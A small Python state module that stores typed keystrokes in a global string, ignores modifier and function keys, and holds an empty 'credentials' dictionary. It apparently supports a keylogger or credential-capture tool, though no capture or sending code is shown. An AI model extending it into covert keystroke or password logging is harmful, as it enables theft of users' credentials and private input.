credentials = {}
keyboard_clicks = ""
keys_to_ignore = ['back', 'shift', 'caps lock', 'ctrl', 'alt', 'esc', 'tab', 'home', 'end', 'page up',
                  'page down', 'insert', 'delete', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11',
                  'f12', 'backspace', 'right shift', 'left shift']


def get_keyboard_clicks():
    global keyboard_clicks
    return keyboard_clicks


def get_keys_to_ignore():
    global keys_to_ignore
    return keys_to_ignore


def set_keyboard_clicks(click):
    global keyboard_clicks
    keyboard_clicks = keyboard_clicks + click


def clear_keyboard_clicks():
    global keyboard_clicks
    keyboard_clicks = ""
